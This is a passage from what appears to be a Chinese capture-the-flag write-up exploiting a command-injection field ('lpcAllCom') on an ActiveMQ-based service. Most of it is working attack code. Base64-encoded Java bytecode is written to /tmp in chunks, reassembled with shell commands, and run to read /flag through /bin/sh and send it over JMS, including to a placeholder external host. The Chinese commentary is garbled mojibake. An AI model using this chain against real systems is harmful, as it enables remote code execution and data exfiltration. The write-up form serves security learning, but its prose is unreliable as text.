am1zL1Nlc3Npb247AQALY3JlYXRlUXVldWUBACUoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZheC9qbXMvUXVldWU7AQAOY3JlYXRlUHJvZHVjZXIBADQoTGphdmF4L2ptcy9EZXN0aW5hdGlvbjspTGphdmF4L2ptcy9NZXNzYWdlUHJvZHVjZXI7AQAFc3RhcnQBABUoKUxqYXZhL2xhbmcvUHJvY2VzczsBABFqYXZhL2xhbmcvUHJvY2VzcwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYBAAx1c2VEZWxpbWl0ZXIBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL3V0aWwvU2Nhbm5lcjsBAARuZXh0AQAUKClMamF2YS9sYW5nL1N0cmluZzsBAAhnZXRCeXRlcwEABCgpW0IBAAUoW0IpVgEAEWNyZWF0ZVRleHRNZXNzYWdlAQAZKClMamF2YXgvam1zL1RleHRNZXNzYWdlOwEAB3NldFRleHQBABlqYXZheC9qbXMvTWVzc2FnZVByb2R1Y2VyAQAEc2VuZAEAEGphdmEvbGFuZy9TeXN0ZW0BAANvdXQBABVMamF2YS9pby9QcmludFN0cmVhbTsBABNqYXZhL2lvL1ByaW50U3RyZWFtAQAHcHJpbnRsbgEABWNsb3NlAQAOY3JlYXRlQ29uc3VtZXIBADQoTGphdmF4L2ptcy9EZXN0aW5hdGlvbjspTGphdmF4L2ptcy9NZXNzYWdlQ29uc3VtZXI7AQAZamF2YXgvam1zL01lc3NhZ2VDb25zdW1lcgEAEnNldE1lc3NhZ2VMaXN0ZW5lcgEAHihMamF2YXgvam1zL01lc3NhZ2VMaXN0ZW5lcjspVgEABmFwcGVuZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwEAB2dldFRleHQBAAh0b1N0cmluZwEAD3ByaW50U3RhY2tUcmFjZQAhACUAMQABADIAAAAFAAEAMwA0AAEANQAAAC8AAQABAAAABSq3AAGxAAAAAgA2AAAABgABAAAABQA3AAAADAABAAAABQA4ADkAAAACADoANAACADUAAAFeAAUACgAAAJq7AAJZEgO3AARMK7kABQEATSwDBLkABwMATi0SCLkACQIAOgQtGQS5AAoCADoFBr0AC1kDEgxTWQQSDVNZBRIOUzoGuwAPWbsAEFkZBrcAEbYAErYAE7cAFBIVtgAWtgAXtgAYOge7AAtZGQe3ABk6CC25ABoBADoJGQkZCLkAGwIAGQUZCbkAHAIAsgAdEh62AB8suQAgAQCxAAAAAgA2AAAARgARAAAACAAKAAkAEQAKABoACwAkAAwALgANAEMADgBbAA8AXgAQAGEAEQBmABIAcQATAHkAFACCABUAiwAWAJMAFwCZABgANwAAAGYACgAAAJoAOAA5AAAACgCQADsAPAABABEAiQA9AD4AAgAaAIAAPwBAAAMAJAB2AEEAQgAEAC4AbABDAEQABQBDAFcARQBGAAYAZgA0AEcASAAHAHEAKQBJAEoACAB5ACEASwBMAAkATQAAAAQAAQAvAAIATgA0AAIANQAAALUAAwAGAAAAPbsAAlkSIbcABEwruQAFAQBNLAMEuQAHAwBOLRIIuQAJAgA6BC0ZBLkAIgIAOgUZBSq5ACMCACy5ACQBALEAAAACADYAAAAiAAgAAAAbAAoAHAARAB0AGgAeACQAHwAuACAANgAhADwAIgA3AAAAPgAGAAAAPQA4ADkAAAAKADMAOwA8AAEAEQAsAD0APgACABoAIwBPAEAAAwAkABkAQQBCAAQALgAPAFAAUQAFAE0AAAAEAAEALwAJAFIAUwACADUAAABJAAIAAgAAAA27ACVZtwAmTCu3ACexAAAAAgA2AAAADgADAAAAJgAIACcADAAoADcAAAAWAAIAAAANAFQARgAAAAgABQBSADkAAQBNAAAABAABAC8AAQBVAFYAAQA1AAAAjQADAAMAAAAqsgAduwAoWbcAKRIqtgArK8AALLkALQEAtgArtgAutgAfpwAITSy2ADCxAAEAAAAhACQALwADADYAAAAWAAUAAAAtACEAMAAkAC4AJQAvACkAMQA3AAAAIAADACUABABXAFgAAgAAACoAOAA5AAAAAAAqAEkAWQABAFoAAAAHAAJkBwAvBAABAFsAAAACAFw=|base64 -d &gt;/tmp/mlgb.txt&quot;</span>]&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJscGNBbGxDb20iOlsiZWNobyB5djY2dmdBQUFEUUF3UW9BTVFCZEJ3QmVDQUJmQ2dBQ0FHQUxBR0VBWWdjQVl3c0FaQUJsQ0FCbUN3QUdBR2NMQUFZQWFBY0FhUWdBYWdnQWF3Z0FiQWNBYlFjQWJnb0FFQUJ2Q2dBUUFIQUtBSEVBY2dvQUR3QnpDQUIwQ2dBUEFIVUtBQThBZGdvQUN3QjNDZ0FMQUhnTEFBWUFlUXNBTEFCNkN3QjdBSHdKQUgwQWZnZ0Fmd29BZ0FDQkN3QmtBSUlJQUlNTEFBWUFoQXNBaFFDR0N3QmtBSWNIQUlnS0FDVUFYUW9BSlFDSkJ3Q0tDZ0FvQUYwSUFJc0tBQ2dBakFjQWpRc0FMQUNPQ2dBb0FJOEhBSkFLQUM4QWtRY0FrZ2NBa3dFQUJqeHBibWwwUGdFQUF5Z3BWZ0VBQkVOdlpHVUJBQTlNYVc1bFRuVnRZbVZ5VkdGaWJHVUJBQkpNYjJOaGJGWmhjbWxoWW14bFZHRmliR1VCQUFSMGFHbHpBUUFHVEUxaGFXNDdBUUFIY0hWaWJHbHphQUVBQjJaaFkzUnZjbmtCQUIxTWFtRjJZWGd2YW0xekwwTnZibTVsWTNScGIyNUdZV04wYjNKNU93RUFDbU52Ym01bFkzUnBiMjRCQUJaTWFtRjJZWGd2YW0xekwwTnZibTVsWTNScGIyNDdBUUFLY0hWaVUyVnpjMmx2YmdFQUUweHFZWFpoZUM5cWJYTXZVMlZ6YzJsdmJqc0JBQVZ4ZFdWMVpRRUFFVXhxWVhaaGVDOXFiWE12VVhWbGRXVTdBUUFKY0hWaWJHbHphR1Z5QVFBYlRHcGhkbUY0TDJwdGN5OU5aWE56WVdkbFVISnZaSFZqWlhJN0FRQURZMjFrQVFBVFcweHFZWFpoTDJ4aGJtY3ZVM1J5YVc1bk93RUFBbUp6QVFBQ1cwSUJBQWR0WlhOellXZGxBUUFTVEdwaGRtRXZiR0Z1Wnk5VGRISnBibWM3QVFBRGJYTm5BUUFYVEdwaGRtRjRMMnB0Y3k5VVpYaDBUV1Z6YzJGblpUc0JBQXBGZUdObGNIUnBiMjV6QVFBSFkyOXVjM1Z0WlFFQUNuTjFZbE5sYzNOcGIyNEJBQXB6ZFdKelkzSnBZbVZ5QVFBYlRHcGhkbUY0TDJwdGN5OU5aWE56WVdkbFEyOXVjM1Z0WlhJN0FRQUViV0ZwYmdFQUZpaGJUR3BoZG1FdmJHRnVaeTlUZEhKcGJtYzdLVllCQUFSaGNtZHpBUUFKYjI1TlpYTnpZV2RsQVFBV0tFeHFZWFpoZUM5cWJYTXZUV1Z6YzJGblpUc3BWZ0VBQVdVQkFCVk1hbUYyWVM5c1lXNW5MMFY0WTJWd2RHbHZianNCQUJOTWFtRjJZWGd2YW0xekwwMWxjM05oWjJVN0FRQU5VM1JoWTJ0TllYQlVZV0pzWlFFQUNsTnZkWEpqWlVacGJHVUJBQWxOWVdsdUxtcGhkbUVNQURNQU5BRUFMVzl5Wnk5aGNHRmphR1V2WVdOMGFYWmxiWEV2UVdOMGFYWmxUVkZEYjI1dVpXTjBhVzl1Um1GamRHOXllUUVBRlhSamNEb3ZMekV5Tnk0d0xqQXVNVG8yTVRZeE5nd0FNd0NVQndDVkRBQ1dBSmNCQUJGcVlYWmhlQzlxYlhNdlUyVnpjMmx2YmdjQW1Bd0FtUUNhQVFBSlpteGhaM0YxWlhWbERBQ2JBSndNQUowQW5nRUFFR3BoZG1FdmJHRnVaeTlUZEhKcGJtY0JBQWN2WW1sdUwzTm9BUUFDTFdNQkFBbGpZWFFnTDJac1lXY0JBQkZxWVhaaEwzVjBhV3d2VTJOaGJtNWxjZ0VBR0dwaGRtRXZiR0Z1Wnk5UWNtOWpaWE56UW5WcGJHUmxjZ3dBTXdCVERBQ2ZBS0FIQUtFTUFLSUFvd3dBTXdDa0FRQUNYRUVNQUtVQXBnd0Fwd0NvREFDcEFLb01BRE1BcXd3QXJBQ3REQUN1QUpRSEFLOE1BTEFBVmdjQXNRd0FzZ0N6QVFBUWNIVmliR2x6YUNCbWFXNXBjMmhsWkFjQXRBd0F0UUNVREFDMkFEUUJBQTkwWTNBNkx5OTRlSGc2TmpFMk1UWU1BTGNBdUFjQXVRd0F1Z0M3REFDZkFEUUJBQVJOWVdsdURBQTZBRFFCQUJkcVlYWmhMMnhoYm1jdlUzUnlhVzVuUW5WcGJHUmxjZ0VBQ1ZKbFkyVnBkbVZrSUF3QXZBQzlBUUFWYW1GMllYZ3ZhbTF6TDFSbGVIUk5aWE56WVdkbERBQytBS2dNQUw4QXFBRUFFMnBoZG1FdmJHRnVaeTlGZUdObGNIUnBiMjRNQU1BQU5BRUFFR3BoZG1FdmJHRnVaeTlQWW1wbFkzUUJBQmxxWVhaaGVDOXFiWE12VFdWemMyRm5aVXhwYzNSbGJtVnlBUUFWS0V4cVlYWmhMMnhoYm1jdlUzUnlhVzVuT3lsV0FRQWJhbUYyWVhndmFtMXpMME52Ym01bFkzUnBiMjVHWVdOMGIzSjVBUUFRWTNKbFlYUmxRMjl1Ym1WamRHbHZiZ0VBR0NncFRHcGhkbUY0TDJwdGN5OURiMjV1WldOMGFXOXVPd0VBRkdwaGRtRjRMMnB0Y3k5RGIyNXVaV04wYVc5dUFRQU5ZM0psWVhSbFUyVnpjMmx2YmdFQUZ5aGFTU2xNYW1GMllYZ3ZhbTF6TDFObGMzTnBiMjQ3QVFBTFkzSmxZWFJsVVhWbGRXVUJBQ1VvVEdwaGRtRXZiR0Z1Wnk5VGRISnBibWM3S1V4cVlYWmhlQzlxYlhNdlVYVmxkV1U3QVFBT1kzSmxZWFJsVUhKdlpIVmpaWElCQURRb1RHcGhkbUY0TDJwdGN5OUVaWE4wYVc1aGRHbHZianNwVEdwaGRtRjRMMnB0Y3k5TlpYTnpZV2RsVUhKdlpIVmpaWEk3QVFBRmMzUmhjblFCQUJVb0tVeHFZWFpoTDJ4aGJtY3ZVSEp2WTJWemN6c0JBQkZxWVhaaEwyeGhibWN2VUhKdlkyVnpjd0VBRG1kbGRFbHVjSFYwVTNSeVpXRnRBUUFYS0NsTWFtRjJZUzlwYnk5SmJuQjFkRk4wY21WaGJUc0JBQmdvVEdwaGRtRXZhVzh2U1c1d2RYUlRkSEpsWVcwN0tWWUJBQXgxYzJWRVpXeHBiV2wwWlhJQkFDY29UR3BoZG1FdmJHRnVaeTlUZEhKcGJtYzdLVXhxWVhaaEwzVjBhV3d2VTJOaGJtNWxjanNCQUFSdVpYaDBBUUFVS0NsTWFtRjJZUzlzWVc1bkwxTjBjbWx1WnpzQkFBaG5aWFJDZVhSbGN3RUFCQ2dwVzBJQkFBVW9XMElwVmdFQUVXTnlaV0YwWlZSbGVIUk5aWE56WVdkbEFRQVpLQ2xNYW1GMllYZ3ZhbTF6TDFSbGVIUk5aWE56WVdkbE93RUFCM05sZEZSbGVIUUJBQmxxWVhaaGVDOXFiWE12VFdWemMyRm5aVkJ5YjJSMVkyVnlBUUFFYzJWdVpBRUFFR3BoZG1FdmJHRnVaeTlUZVhOMFpXMEJBQU52ZFhRQkFCVk1hbUYyWVM5cGJ5OVFjbWx1ZEZOMGNtVmhiVHNCQUJOcVlYWmhMMmx2TDFCeWFXNTBVM1J5WldGdEFRQUhjSEpwYm5Sc2JnRUFCV05zYjNObEFRQU9ZM0psWVhSbFEyOXVjM1Z0WlhJQkFEUW9UR3BoZG1GNEwycHRjeTlFWlhOMGFXNWhkR2x2YmpzcFRHcGhkbUY0TDJwdGN5OU5aWE56WVdkbFEyOXVjM1Z0WlhJN0FRQVphbUYyWVhndmFtMXpMMDFsYzNOaFoyVkRiMjV6ZFcxbGNnRUFFbk5sZEUxbGMzTmhaMlZNYVhOMFpXNWxjZ0VBSGloTWFtRjJZWGd2YW0xekwwMWxjM05oWjJWTWFYTjBaVzVsY2pzcFZnRUFCbUZ3Y0dWdVpBRUFMU2hNYW1GMllTOXNZVzVuTDFOMGNtbHVaenNwVEdwaGRtRXZiR0Z1Wnk5VGRISnBibWRDZFdsc1pHVnlPd0VBQjJkbGRGUmxlSFFCQUFoMGIxTjBjbWx1WndFQUQzQnlhVzUwVTNSaFkydFVjbUZqWlFBaEFDVUFNUUFCQURJQUFBQUZBQUVBTXdBMEFBRUFOUUFBQUM4QUFRQUJBQUFBQlNxM0FBR3hBQUFBQWdBMkFBQUFCZ0FCQUFBQUJRQTNBQUFBREFBQkFBQUFCUUE0QURrQUFBQUNBRG9BTkFBQ0FEVUFBQUZlQUFVQUNnQUFBSnE3QUFKWkVnTzNBQVJNSzdrQUJRRUFUU3dEQkxrQUJ3TUFUaTBTQ0xrQUNRSUFPZ1F0R1FTNUFBb0NBRG9GQnIwQUMxa0RFZ3hUV1FRU0RWTlpCUklPVXpvR3V3QVBXYnNBRUZrWkJyY0FFYllBRXJZQUU3Y0FGQklWdGdBV3RnQVh0Z0FZT2dlN0FBdFpHUWUzQUJrNkNDMjVBQm9CQURvSkdRa1pDTGtBR3dJQUdRVVpDYmtBSEFJQXNnQWRFaDYyQUI4c3VRQWdBUUN4QUFBQUFnQTJBQUFBUmdBUkFBQUFDQUFLQUFrQUVRQUtBQm9BQ3dBa0FBd0FMZ0FOQUVNQURnQmJBQThBWGdBUUFHRUFFUUJtQUJJQWNRQVRBSGtBRkFDQ0FCVUFpd0FXQUpNQUZ3Q1pBQmdBTndBQUFHWUFDZ0FBQUpvQU9BQTVBQUFBQ2dDUUFEc0FQQUFCQUJFQWlRQTlBRDRBQWdBYUFJQUFQd0JBQUFNQUpBQjJBRUVBUWdBRUFDNEFiQUJEQUVRQUJRQkRBRmNBUlFCR0FBWUFaZ0EwQUVjQVNBQUhBSEVBS1FCSkFFb0FDQUI1QUNFQVN3Qk1BQWtBVFFBQUFBUUFBUUF2QUFJQVRnQTBBQUlBTlFBQUFMVUFBd0FHQUFBQVBic0FBbGtTSWJjQUJFd3J1UUFGQVFCTkxBTUV1UUFIQXdCT0xSSUl1UUFKQWdBNkJDMFpCTGtBSWdJQU9nVVpCU3E1QUNNQ0FDeTVBQ1FCQUxFQUFBQUNBRFlBQUFBaUFBZ0FBQUFiQUFvQUhBQVJBQjBBR2dBZUFDUUFId0F1QUNBQU5nQWhBRHdBSWdBM0FBQUFQZ0FHQUFBQVBRQTRBRGtBQUFBS0FETUFPd0E4QUFFQUVRQXNBRDBBUGdBQ0FCb0FJd0JQQUVBQUF3QWtBQmtBUVFCQ0FBUUFMZ0FQQUZBQVVRQUZBRTBBQUFBRUFBRUFMd0FKQUZJQVV3QUNBRFVBQUFCSkFBSUFBZ0FBQUEyN0FDVlp0d0FtVEN1M0FDZXhBQUFBQWdBMkFBQUFEZ0FEQUFBQUpnQUlBQ2NBREFBb0FEY0FBQUFXQUFJQUFBQU5BRlFBUmdBQUFBZ0FCUUJTQURrQUFRQk5BQUFBQkFBQkFDOEFBUUJWQUZZQUFRQTFBQUFBalFBREFBTUFBQUFxc2dBZHV3QW9XYmNBS1JJcXRnQXJLOEFBTExrQUxRRUF0Z0FydGdBdXRnQWZwd0FJVFN5MkFEQ3hBQUVBQUFBaEFDUUFMd0FEQURZQUFBQVdBQVVBQUFBdEFDRUFNQUFrQUM0QUpRQXZBQ2tBTVFBM0FBQUFJQUFEQUNVQUJBQlhBRmdBQWdBQUFDb0FPQUE1QUFBQUFBQXFBRWtBV1FBQkFGb0FBQUFIQUFKa0J3QXZCQUFCQUZzQUFBQUNBRnc9fGJhc2U2NCAtZCA+L3RtcC9tbGdiLnR4dCIsImVjaG8geXY2NnZnQUFBRFFBd1FvQU1RQmRCd0JlQ0FCZkNnQUNBR0FMQUdFQVlnY0FZd3NBWkFCbENBQm1Dd0FHQUdjTEFBWUFhQWNBYVFnQWFnZ0Fhd2dBYkFjQWJRY0FiZ29BRUFCdkNnQVFBSEFLQUhFQWNnb0FEd0J6Q0FCMENnQVBBSFVLQUE4QWRnb0FDd0IzQ2dBTEFIZ0xBQVlBZVFzQUxBQjZDd0I3QUh3SkFIMEFmZ2dBZndvQWdBQ0JDd0JrQUlJSUFJTUxBQVlBaEFzQWhRQ0dDd0JrQUljSEFJZ0tBQ1VBWFFvQUpRQ0pCd0NLQ2dBb0FGMElBSXNLQUNnQWpBY0FqUXNBTEFDT0NnQW9BSThIQUpBS0FDOEFrUWNBa2djQWt3RUFCanhwYm1sMFBnRUFBeWdwVmdFQUJFTnZaR1VCQUE5TWFXNWxUblZ0WW1WeVZHRmliR1VCQUJKTWIyTmhiRlpoY21saFlteGxWR0ZpYkdVQkFBUjBhR2x6QVFBR1RFMWhhVzQ3QVFBSGNIVmliR2x6YUFFQUIyWmhZM1J2Y25rQkFCMU1hbUYyWVhndmFtMXpMME52Ym01bFkzUnBiMjVHWVdOMGIzSjVPd0VBQ21OdmJtNWxZM1JwYjI0QkFCWk1hbUYyWVhndmFtMXpMME52Ym01bFkzUnBiMjQ3QVFBS2NIVmlVMlZ6YzJsdmJnRUFFMHhxWVhaaGVDOXFiWE12VTJWemMybHZianNCQUFWeGRXVjFaUUVBRVV4cVlYWmhlQzlxYlhNdlVYVmxkV1U3QVFBSmNIVmliR2x6YUdWeUFRQWJUR3BoZG1GNEwycHRjeTlOWlhOellXZGxVSEp2WkhWalpYSTdBUUFEWTIxa0FRQVRXMHhxWVhaaEwyeGhibWN2VTNSeWFXNW5Pd0VBQW1KekFRQUNXMElCQUFkdFpYTnpZV2RsQVFBU1RHcGhkbUV2YkdGdVp5OVRkSEpwYm1jN0FRQURiWE5uQVFBWFRHcGhkbUY0TDJwdGN5OVVaWGgwVFdWemMyRm5aVHNCQUFwRmVHTmxjSFJwYjI1ekFRQUhZMjl1YzNWdFpRRUFDbk4xWWxObGMzTnBiMjRCQUFwemRXSnpZM0pwWW1WeUFRQWJUR3BoZG1GNEwycHRjeTlOWlhOellXZGxRMjl1YzNWdFpYSTdBUUFFYldGcGJnRUFGaWhiVEdwaGRtRXZiR0Z1Wnk5VGRISnBibWM3S1ZZQkFBUmhjbWR6QVFBSmIyNU5aWE56WVdkbEFRQVdLRXhxWVhaaGVDOXFiWE12VFdWemMyRm5aVHNwVmdFQUFXVUJBQlZNYW1GMllTOXNZVzVuTDBWNFkyVndkR2x2YmpzQkFCTk1hbUYyWVhndmFtMXpMMDFsYzNOaFoyVTdBUUFOVTNSaFkydE5ZWEJVWVdKc1pRRUFDbE52ZFhKalpVWnBiR1VCQUFsTllXbHVMbXBoZG1FTUFETUFOQUVBTFc5eVp5OWhjR0ZqYUdVdllXTjBhWFpsYlhFdlFXTjBhWFpsVFZGRGIyNXVaV04wYVc5dVJtRmpkRzl5ZVFFQUZYUmpjRG92THpFeU55NHdMakF1TVRvMk1UWXhOZ3dBTXdDVUJ3Q1ZEQUNXQUpjQkFCRnFZWFpoZUM5cWJYTXZVMlZ6YzJsdmJnY0FtQXdBbVFDYUFRQUpabXhoWjNGMVpYVmxEQUNiQUp3TUFKMEFuZ0VBRUdwaGRtRXZiR0Z1Wnk5VGRISnBibWNCQUFjdlltbHVMM05vQVFBQ0xXTUJBQWxqWVhRZ0wyWnNZV2NCQUJGcVlYWmhMM1YwYVd3dlUyTmhibTVsY2dFQUdHcGhkbUV2YkdGdVp5OVFjbTlqWlhOelFuVnBiR1JsY2d3QU13QlREQUNmQUtBSEFLRU1BS0lBb3d3QU13Q2tBUUFDWEVFTUFLVUFwZ3dBcHdDb0RBQ3BBS29NQURNQXF3d0FyQUN0REFDdUFKUUhBSzhNQUxBQVZnY0FzUXdBc2dDekFRQVFjSFZpYkdsemFDQm1hVzVwYzJobFpBY0F0QXdBdFFDVURBQzJBRFFCQUE5MFkzQTZMeTk0ZUhnNk5qRTJNVFlNQUxjQXVBY0F1UXdBdWdDN0RBQ2ZBRFFCQUFSTllXbHVEQUE2QURRQkFCZHFZWFpoTDJ4aGJtY3ZVM1J5YVc1blFuVnBiR1JsY2dFQUNWSmxZMlZwZG1Wa0lBd0F2QUM5QVFBVmFtRjJZWGd2YW0xekwxUmxlSFJOWlhOellXZGxEQUMrQUtnTUFMOEFxQUVBRTJwaGRtRXZiR0Z1Wnk5RmVHTmxjSFJwYjI0TUFNQUFOQUVBRUdwaGRtRXZiR0Z1Wnk5UFltcGxZM1FCQUJscVlYWmhlQzlxYlhNdlRXVnpjMkZuWlV4cGMzUmxibVZ5QVFBVktFeHFZWFpoTDJ4aGJtY3ZVM1J5YVc1bk95bFdBUUFiYW1GMllYZ3ZhbTF6TDBOdmJtNWxZM1JwYjI1R1lXTjBiM0o1QVFBUVkzSmxZWFJsUTI5dWJtVmpkR2x2YmdFQUdDZ3BUR3BoZG1GNEwycHRjeTlEYjI1dVpXTjBhVzl1T3dFQUZHcGhkbUY0TDJwdGN5OURiMjV1WldOMGFXOXVBUUFOWTNKbFlYUmxVMlZ6YzJsdmJnRUFGeWhhU1NsTWFtRjJZWGd2YW0xekwxTmxjM05wYjI0N0FRQUxZM0psWVhSbFVYVmxkV1VCQUNVb1RHcGhkbUV2YkdGdVp5OVRkSEpwYm1jN0tVeHFZWFpoZUM5cWJYTXZVWFZsZFdVN0FRQU9ZM0psWVhSbFVISnZaSFZqWlhJQkFEUW9UR3BoZG1GNEwycHRjeTlFWlhOMGFXNWhkR2x2YmpzcFRHcGhkbUY0TDJwdGN5OU5aWE56WVdkbFVISnZaSFZqWlhJN0FRQUZjM1JoY25RQkFCVW9LVXhxWVhaaEwyeGhibWN2VUhKdlkyVnpjenNCQUJGcVlYWmhMMnhoYm1jdlVISnZZMlZ6Y3dFQURtZGxkRWx1Y0hWMFUzUnlaV0Z0QVFBWEtDbE1hbUYyWVM5cGJ5OUpibkIxZEZOMGNtVmhiVHNCQUJnb1RHcGhkbUV2YVc4dlNXNXdkWFJUZEhKbFlXMDdLVllCQUF4MWMyVkVaV3hwYldsMFpYSUJBQ2NvVEdwaGRtRXZiR0Z1Wnk5VGRISnBibWM3S1V4cVlYWmhMM1YwYVd3dlUyTmhibTVsY2pzQkFBUnVaWGgwQVFBVUtDbE1hbUYyWVM5c1lXNW5MMU4wY21sdVp6c0JBQWhuWlhSQ2VYUmxjd0VBQkNncFcwSUJBQVVvVzBJcFZnRUFFV055WldGMFpWUmxlSFJOWlhOellXZGxBUUFaS0NsTWFtRjJZWGd2YW0xekwxUmxlSFJOWlhOellXZGxPd0VBQjNObGRGUmxlSFFCQUJscVlYWmhlQzlxYlhNdlRXVnpjMkZuWlZCeWIyUjFZMlZ5QVFBRWMyVnVaQUVBRUdwaGRtRXZiR0Z1Wnk5VGVYTjBaVzBCQUFOdmRYUUJBQlZNYW1GMllTOXBieTlRY21sdWRGTjBjbVZoYlRzQkFCTnFZWFpoTDJsdkwxQnlhVzUwVTNSeVpXRnRBUUFIY0hKcGJuUnNiZ0VBQldOc2IzTmxBUUFPWTNKbFlYUmxRMjl1YzNWdFpYSUJBRFFvVEdwaGRtRjRMMnB0Y3k5RVpYTjBhVzVoZEdsdmJqc3BUR3BoZG1GNEwycHRjeTlOWlhOellXZGxRMjl1YzNWdFpYSTdBUUFaYW1GMllYZ3ZhbTF6TDAxbGMzTmhaMlZEYjI1emRXMWxjZ0VBRW5ObGRFMWxjM05oWjJWTWFYTjBaVzVsY2dFQUhpaE1hbUYyWVhndmFtMXpMMDFsYzNOaFoyVk1hWE4wWlc1bGNqc3BWZ0VBQm1Gd2NHVnVaQUVBTFNoTWFtRjJZUzlzWVc1bkwxTjBjbWx1WnpzcFRHcGhkbUV2YkdGdVp5OVRkSEpwYm1kQ2RXbHNaR1Z5T3dFQUIyZGxkRlJsZUhRQkFBaDBiMU4wY21sdVp3RUFEM0J5YVc1MFUzUmhZMnRVY21GalpRQWhBQ1VBTVFBQkFESUFBQUFGQUFFQU13QTBBQUVBTlFBQUFDOEFBUUFCQUFBQUJTcTNBQUd4QUFBQUFnQTJBQUFBQmdBQkFBQUFCUUEzQUFBQURBQUJBQUFBQlFBNEFEa0FBQUFDQURvQU5BQUNBRFVBQUFGZUFBVUFDZ0FBQUpxN0FBSlpFZ08zQUFSTUs3a0FCUUVBVFN3REJMa0FCd01BVGkwU0NMa0FDUUlBT2dRdEdRUzVBQW9DQURvRkJyMEFDMWtERWd4VFdRUVNEVk5aQlJJT1V6b0d1d0FQV2JzQUVGa1pCcmNBRWJZQUVyWUFFN2NBRkJJVnRnQVd0Z0FYdGdBWU9nZTdBQXRaR1FlM0FCazZDQzI1QUJvQkFEb0pHUWtaQ0xrQUd3SUFHUVVaQ2JrQUhBSUFzZ0FkRWg2MkFCOHN1UUFnQVFDeEFBQUFBZ0EyQUFBQVJnQVJBQUFBQ0FBS0FBa0FFUUFLQUJvQUN3QWtBQXdBTGdBTkFFTUFEZ0JiQUE4QVhnQVFBR0VBRVFCbUFCSUFjUUFUQUhrQUZBQ0NBQlVBaXdBV0FKTUFGd0NaQUJnQU53QUFBR1lBQ2dBQUFKb0FPQUE1QUFBQUNnQ1FBRHNBUEFBQkFCRUFpUUE5QUQ0QUFnQWFBSUFBUHdCQUFBTUFKQUIyQUVFQVFnQUVBQzRBYkFCREFFUUFCUUJEQUZjQVJRQkdBQVlBWmdBMEFFY0FTQUFIQUhFQUtRQkpBRW9BQ0FCNUFDRUFTd0JNQUFrQVRRQUFBQVFBQVFBdkFBSUFUZ0EwQUFJQU5RQUFBTFVBQXdBR0FBQUFQYnNBQWxrU0liY0FCRXdydVFBRkFRQk5MQU1FdVFBSEF3Qk9MUklJdVFBSkFnQTZCQzBaQkxrQUlnSUFPZ1VaQlNxNUFDTUNBQ3k1QUNRQkFMRUFBQUFDQURZQUFBQWlBQWdBQUFBYkFBb0FIQUFSQUIwQUdnQWVBQ1FBSHdBdUFDQUFOZ0FoQUR3QUlnQTNBQUFBUGdBR0FBQUFQUUE0QURrQUFBQUtBRE1BT3dBOEFBRUFFUUFzQUQwQVBnQUNBQm9BSXdCUEFFQUFBd0FrQUJrQVFRQkNBQVFBTGdBUEFGQUFVUUFGQUUwQUFBQUVBQUVBTHdBSkFGSUFVd0FDQURVQUFBQkpBQUlBQWdBQUFBMjdBQ1ZadHdBbVRDdTNBQ2V4QUFBQUFnQTJBQUFBRGdBREFBQUFKZ0FJQUNjQURBQW9BRGNBQUFBV0FBSUFBQUFOQUZRQVJnQUFBQWdBQlFCU0FEa0FBUUJOQUFBQUJBQUJBQzhBQVFCVkFGWUFBUUExQUFBQWpRQURBQU1BQUFBcXNnQWR1d0FvV2JjQUtSSXF0Z0FySzhBQUxMa0FMUUVBdGdBcnRnQXV0Z0FmcHdBSVRTeTJBREN4QUFFQUFBQWhBQ1FBTHdBREFEWUFBQUFXQUFVQUFBQXRBQ0VBTUFBa0FDNEFKUUF2QUNrQU1RQTNBQUFBSUFBREFDVUFCQUJYQUZnQUFnQUFBQ29BT0FBNUFBQUFBQUFxQUVrQVdRQUJBRm9BQUFBSEFBSmtCd0F2QkFBQkFGc0FBQUFDQUZ3PXxiYXNlNjQgLWQgPi90bXAvbWxnYi50eHQiXX0=</span><br></pre></td></tr></table></figure><p>ç„¶åbase64 ç¼–ç ,æ”¾å…¥onewayçš„è·¯å¾„ğŸ¤ª</p><p>ç»è°ƒè¯•,ç”±äºä¸€æ¬¡æ€§ä¸èƒ½å†™é‚£ä¹ˆé•¿çš„å†…å®¹,åªèƒ½æ›²çº¿æ•‘å›½</p><p>åˆ†æ®µå†™å…¥ 1å’Œ2,ç„¶ååˆå¹¶å†™å…¥3,å†base64è§£ç (è¿™nmæ˜¯äººèƒ½æå‡ºæ¥çš„æ“ä½œ?æœ¬æ¥å°±æ¶å¿ƒ,è¿˜ç»™ğŸ‘´ä½¿ç»Š,å·®ä¸å¤šå¾—äº†ğŸ˜…ğŸ˜“)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;lpcAllCom&quot;</span>:[<span class="string">&quot;cat /tmp/1 /tmp/2|tr -d &#x27;\n&#x27;|tee /tmp/3&quot;</span>,<span class="string">&quot;cat /tmp/1 /tmp/2|tr -d &#x27;\n&#x27;|tee /tmp/3&quot;</span>]&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;lpcAllCom&quot;</span>:[<span class="string">&quot;base64 -d -i /tmp/sss |tee /tmp/Main.class&quot;</span>,<span class="string">&quot;base64 -d -i /tmp/sss |tee /tmp/Main.class&quot;</span>]&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJscGNBbGxDb20iOlsiYmFzZTY0IC1kIC1pIC90bXAvc3NzIHx0ZWUgL3RtcC9NYWluLmNsYXNzIiwiYmFzZTY0IC1kIC1pIC90bXAvc3NzIHx0ZWUgL3RtcC9NYWluLmNsYXNzIl19</span><br></pre></td></tr></table></figure><p>è§£ç ,å†™å‡ºMain.class</p><p>javaè¿è¡ŒğŸ¤”</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp /opt/apache-activemq/lib/optional<span class="comment">/*:/tmp:/opt/apache-activemq/activemq-all-5.17.5.jar 